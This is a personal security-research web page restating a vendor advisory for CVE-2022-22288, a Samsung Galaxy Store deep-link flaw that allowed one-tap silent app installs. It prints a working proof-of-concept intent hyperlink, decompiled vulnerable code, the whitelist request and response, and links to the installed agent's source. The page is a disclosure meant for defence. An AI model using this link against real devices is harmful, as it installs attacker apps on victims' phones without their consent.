<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2022-22288 Details | YayWebsiteYay (I suck at titles)</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2022-22288 Details" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
<link rel="canonical" href="http://localhost:4000/cves/cve-2022-22288" />
<meta property="og:url" content="http://localhost:4000/cves/cve-2022-22288" />
<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2022-22288 Details" />
<script type="application/ld+json">
{"@type":"WebPage","headline":"CVE-2022-22288 Details","url":"http://localhost:4000/cves/cve-2022-22288","description":"Sometimes I want to publish stuff unfiltered.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post">

  <header class="post-header">
    <h1 class="post-title">CVE-2022-22288 Details</h1>
  </header>

  <div class="post-content">
    <h4 id="original-post-httpslabsf-securecomadvisoriessamsung-galaxy-one-tap-install-malicious-application">Original post: <a href="https://labs.f-secure.com/advisories/samsung-galaxy-one-tap-install-malicious-application/">https://labs.f-secure.com/advisories/samsung-galaxy-one-tap-install-malicious-application/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Galaxy Store prior to version 4.5.36.5</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>High</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2022-22288</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>Automatic Application Install</td>
    </tr>
  </tbody>
</table>

<h2 id="description">Description</h2>

<p>F-Secure looked into exploiting the Samsung Galaxy S21 device for Austin Pwn2Own 2021. The Galaxy App Store application contained an issue with how it handled browsable intents. Additionally, it was possible to upload a malicious application to the Galaxy App Store and have Samsung host the application. If a user was convinced to tap an attacker controlled hyperlink, the uploaded malicious application would have been automatically installed onto the victim’s device without consent.</p>

<h2 id="the-exploit">The Exploit</h2>

<p>The following hyperlink could have been used to abuse a browsable intent in the Samsung Galaxy App Store application. This link would install a malicious application that has hijacked the namespace of a whitelisted application on the Samsung App Store. An attacker can host this link from any web server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a id="yayidyay" rel="noreferrer" href="intent://apps.samsung.com/appquery/appDetail.as?
appId=live.hatch.russa&amp;directInstall=true&amp;installReferrer=yayreferreryay&amp;directOpen=true&amp;
simpleMode=true#Intent;action=android.intent.action.VIEW;package=com.sec.android.app.samsungapps;
scheme=http;S.android%2eintent%2eextra%2eREFERRER_NAME=http://com.sec.android.app.samsungapps;end"&gt;
YAYPOCYAY&lt;/a&gt;
</code></pre></div></div>

<h2 id="technical-details">Technical Details</h2>

<p>The malicious application that would have been installed is Boops Boops, a re-skinned Drozer application. This issue occurs due to a bug in the Samsung Galaxy App Store (<code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps</code>) class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink.DetailPageDeepLink</code> method <code class="language-plaintext highlighter-rouge">putDetailCommonExtra</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public void putDetailCommonExtra(Context context) {
    ...
    if (isDirectInstall() &amp;&amp; appManager.enableDDI(getSender(), getDetailID(), DeeplinkManager.getInstance().getInternalDeeplink())) {
        this.intent.putExtra(DeepLink.EXTRA_DEEPLINK_DIRECT_INSTALL, isDirectInstall());
        this.intent.putExtra("sender", getSender());
    }
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">isDirectInstall</code> is taken from the browsable intent query parameter <code class="language-plaintext highlighter-rouge">directInstall</code> and returns either True or False</li>
  <li><code class="language-plaintext highlighter-rouge">getSender</code> is either the package name or the website URL that sent the browsable intent, which is retrieved from the intent string extra <code class="language-plaintext highlighter-rouge">sender</code> (this intent extra is added or modified in intents by the Android OS when an intent is sent from one application to another)</li>
  <li><code class="language-plaintext highlighter-rouge">getDetailID</code> is taken from the browsable intent query parameter <code class="language-plaintext highlighter-rouge">appId</code></li>
  <li><code class="language-plaintext highlighter-rouge">enableDDI</code> code is below:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean enableDDI(String sender, String appId, boolean isInternalDeeplink) {
    if (isDDITestMode()) {
        return true;
    }
    if ((!isGalaxyStore(sender) || !isInternalDeeplink) &amp;&amp; !isWhiteListAppForOneClick(sender, appId)) {
        return false;
    }
    return true;
}
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">isGalaxyStore</code> returns true if the intent sender package name was <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps</code> or if the website that sent the browsable intent was <code class="language-plaintext highlighter-rouge">http://com.sec.android.app.samsungapps</code></li>
  <li><code class="language-plaintext highlighter-rouge">isWhiteListAppForOneClick</code> returns true if the target package name is in a Samsung controlled whitelist</li>
</ul>

<p>The intent sender package name can be set by an attacker via the intent string extra <code class="language-plaintext highlighter-rouge">android.intent.extra.REFERRER_NAME=com.sec.android.app.samsungapps</code>. Without this intent string extra, <code class="language-plaintext highlighter-rouge">isGalaxyStore</code> would return false since the intent sender would have been a different value, such as the attacker’s website URL.</p>

<p>The Samsung controlled whitelist is obtained by the Galaxy Store application via the following POST request:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /ods.as?reqId=2355 HTTP/1.1
Accept: image/webp
Content-Type: text/plain; charset=UTF-8
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)
Host: us-odc.samsungapps.com
Connection: close
Accept-Encoding: gzip, deflate
Content-Length: 952
 
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;
&lt;SamsungProtocol networkType="0" version2="3" lang="EN" openApiVersion="30" deviceModel="SM-G991B" deviceMakerName="samsung" 
deviceMakerType="0" mcc="310" mnc="00" csc="XME" odcVersion="4.5.30.5" scVersion="1000000" 
storeFilter="themeDeviceModel=SM-G991B_TM||OTFVersion=11010001||gearDeviceModel=SM-G991B_SM-R800||gOSVersion=4.0.0"
supportFeature="ARW||AOD" version="6.8" filter="1" odcType="01" cacheVersion="1" systemId="&lt;redacted&gt;" sessionId="&lt;redacted&gt;" 
logId="&lt;redacted&gt;" deviceFeature="locale=en_US||abi32=armeabi-v7a:armeabi||abi64=arm64-v8a" userMode="0"&gt;
&lt;request name="whiteAppInfo" id="2355" numParam="4" transactionId="&lt;redacted&gt;"&gt;&lt;param name="accountCountry"&gt;
USA&lt;/param&gt;&lt;param name="guestDownloadInfo"&gt;Y&lt;/param&gt;&lt;param name="accountMcc"&gt;310&lt;/param&gt;&lt;param name="requestTypeCode"&gt;0&lt;/param&gt;
&lt;/request&gt;&lt;/SamsungProtocol&gt;
</code></pre></div></div>

<p>The whitelist is found in the response parameter popupDownloadAppList:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
&lt;value name="popupDownloadAppList"&gt;mobi.abcmouse.samsung||com.audible.application.samsung||com.booking.forsamsung||com.cnn.mobile.android.phone|
|com.golfnow.android.samsung.teetimes||com.scribd.app.samsung||com.shazam.android||com.shutterfly.samsung||com.skimble.workouts||me.swiftgift.swiftgift.samsung|
|com.weather.samsung||com.touchofmodern.samsung||com.tubitv.samsung||com.ua.shop.samsung||com.yelp.android||com.aaptiv.android.samsung|
|com.lifesum.madeforsamsung||com.getliner.Liner||com.vsco.cam.samsung||com.rosettastone.madeforsamsung.courseplayer||com.aita||com.degoo.android.samsung|
|com.adobe.reader||com.samsung.m4sscreen||com.adobe.premiererush.videoeditor.samsung||live.hatch.russa||jp.gocro.smartnews.android|
|com.getsomeheadspace.android||com.viewbug.viewbug||com.postmates.android||com.getaround.android&lt;/value&gt;
...
</code></pre></div></div>

<p>It was found that the package name <code class="language-plaintext highlighter-rouge">live.hatch.russa</code> was on the Samsung white list, but that package did not exist on the Samsung App Store itself. F-Secure deployed their custom re-skinned Drozer application called “Boops Boops” to the Samsung App Store with the package name <code class="language-plaintext highlighter-rouge">live.hatch.russa</code>:</p>

<p><img src="/assets/my_cves/cve-2022-22288_1.png" alt="yay" /></p>

<p>Source code for the Boops Boops application can be found here: <a href="https://github.com/Yogehi/boops-boops-android-agent">https://github.com/Yogehi/boops-boops-android-agent</a> or</p>

<p>Source code for the Boops Boops Docker Container which can be used to interact with Boops Boops can be found here: <a href="https://github.com/Yogehi/boops-boops-docker-container">https://github.com/Yogehi/boops-boops-docker-container</a></p>

<h2 id="remedial-action">Remedial Action</h2>

<p>Samsung has released the Galaxy Store version 4.5.36.5 which addresses this issue. Additionally, F-Secure has attempted to re-upload Boops Boops with the package name <code class="language-plaintext highlighter-rouge">live.hatch.russa</code> several times to the Galaxy Store, and it now gets taken down due to a copyright warning.</p>

<p><img src="/assets/my_cves/cve-2022-22288_2.png" alt="yay" /></p>

<p>Users should still update their Galaxy Store application to the latest version available.</p>

<h2 id="credits">Credits</h2>

<p>This issue was discovered by Ken Gannon.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>01/11/2021</td>
      <td>Issue disclosed to Samsung Mobile Security</td>
    </tr>
    <tr>
      <td>01/11/2021</td>
      <td>Issue assigned to a Samsung Security Analyst</td>
    </tr>
    <tr>
      <td>01/12/2021</td>
      <td>Samsung confirms the vulnerability and rates it as a critical risk issue</td>
    </tr>
    <tr>
      <td>03/01/2022</td>
      <td>Patch released, Samsung initiates process for bug bounty reward</td>
    </tr>
    <tr>
      <td>04/01/2022</td>
      <td>CVE Assigned</td>
    </tr>
    <tr>
      <td>04/01/2022</td>
      <td>Advisory Published</td>
    </tr>
  </tbody>
</table>

  </div>

</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Sometimes I want to publish stuff unfiltered.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
